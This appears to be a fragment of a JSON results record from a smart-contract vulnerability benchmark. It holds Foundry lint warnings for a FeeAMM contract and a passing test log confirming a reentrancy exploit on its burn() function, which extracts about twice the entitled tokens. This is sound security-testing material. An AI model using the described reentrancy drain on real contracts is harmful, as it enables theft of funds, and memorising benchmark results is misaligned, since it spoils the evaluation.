https://getfoundry.sh/forge/linting/missing-zero-check\n\nwarning[missing-zero-check]: address parameter is used in a state write or value transfer without a zero-address check\n    â•­â–¸ contracts/FeeAMM.sol:229:9\n    â”‚\n229 â”‚         address userToken,\n    â”‚         â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/missing-zero-check\n\nwarning[reentrancy-events]: event emitted after an external call; reentrancy can reorder or fabricate logs that off-chain consumers rely on\n    â•­â–¸ contracts/FeeAMM.sol:262:9\n    â”‚\n262 â”‚ â”�         emit Burn(\n263 â”‚ â”ƒ             msg.sender,\n264 â”‚ â”ƒ             userToken,\n265 â”‚ â”ƒ             validatorToken,\n    â€¡ â”ƒ\n269 â”‚ â”ƒ             to\n270 â”‚ â”ƒ         );\n    â”‚ â”—â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”›\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/reentrancy-events\n\nwarning[erc20-unchecked-transfer]: ERC20 `transfer` or `transferFrom` call does not check the return value\n    â•­â–¸ contracts/FeeAMM.sol:254:9\n    â”‚\n254 â”‚         IERC20(userToken).transfer(to, amountUserToken);\n    â”‚         â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/erc20-unchecked-transfer\n\nwarning[erc20-unchecked-transfer]: ERC20 `transfer` or `transferFrom` call does not check the return value\n    â•­â–¸ contracts/FeeAMM.sol:255:9\n    â”‚\n255 â”‚         IERC20(validatorToken).transfer(to, amountValidatorToken);\n    â”‚         â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/erc20-unchecked-transfer\n\nwarning[unsafe-typecast]: typecast can truncate values\n    â•­â–¸ contracts/FeeAMM.sol:259:34\n    â”‚\n259 â”‚         pool.reserveUserToken -= uint128(amountUserToken);\n    â”‚                                  â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â”œ note: consider disabling this lint if you're certain the cast is safe\n    â”‚       \n    â”‚       // casting to 'uint128' is safe because [explain why]\n    â”‚       // forge-lint: disable-next-line(unsafe-typecast)\n    â”‚       \n    â”‚       \n    â•° help: https://getfoundry.sh/forge/linting/unsafe-typecast\n\nwarning[unsafe-typecast]: typecast can truncate values\n    â•­â–¸ contracts/FeeAMM.sol:260:39\n    â”‚\n260 â”‚         pool.reserveValidatorToken -= uint128(amountValidatorToken);\n    â”‚                                       â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â”œ note: consider disabling this lint if you're certain the cast is safe\n    â”‚       \n    â”‚       // casting to 'uint128' is safe because [explain why]\n    â”‚       // forge-lint: disable-next-line(unsafe-typecast)\n    â”‚       \n    â”‚       \n    â•° help: https://getfoundry.sh/forge/linting/unsafe-typecast\n\n",
+      "stdout_tail": "No files changed, compilation skipped\n",
+      "timed_out": false,
+      "tool_missing": false
+    },
+    "dependency_install": null,
+    "forge_status": "exploit_success",
+    "project_root": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout",
+    "tests": [
+      {
+        "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2026-01-tempo-feeamm\\checkout --match-test testReentrancyBurnDrain -vvv",
+        "exit_code": 0,
+        "exploit_success": true,
+        "failed": false,
+        "passed": true,
+        "ran": true,
+        "rpc_indicated": true,
+        "stderr_tail": "",
+        "stdout_tail": "No files changed, compilation skipped\n\nRan 1 test for test/ExploitH01.t.sol:ExploitH01Test\n[PASS] testReentrancyBurnDrain() (gas: 2219054)\nLogs:\n  === Initial Pool State ===\n  Pool reserveUserToken: 500000000000\n  Pool reserveValidatorToken: 501500000000\n  \n  === Attacker Setup ===\n  Attacker liquidity tokens: 49962528103\n  \n  === Expected (Fair) Output ===\n  Expected userToken for single burn: 9084714966\n  Expected validatorToken for single burn: 10928912104\n  \n  === Executing Reentrancy Attack ===\n  \n  === Attack Results ===\n  Reentrancy attempts: 1\n  Successful reentries: 1\n  Malicious tokens received: 18169429932\n  Validator tokens received: 21857824208\n  Saw unchanged liquidity: true\n  Reentrant burn succeeded: true\n  \n  === Exploit Verification ===\n  Expected for single burn: 10928912104\n  Expected with reentrancy: 21857824208\n  Actually received: 21857824208\n  \n  === EXPLOIT SUCCESSFUL ===\n  H-01 Reentrancy vulnerability confirmed!\n  Attacker extracted more tokens than entitled by reentering burn()\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.09ms (984.60Âµs CPU time)\n\nRan 1 test suite in 4.31ms (2.09ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n",
+        "test_name": "testReentrancyBurnDrain",
+        "timed_out": false,
+        "tool_missing": false,
+        "vulnerability": "H-01"
+      }
+    ],
+    "verification_level": "L5"
+  }
 }
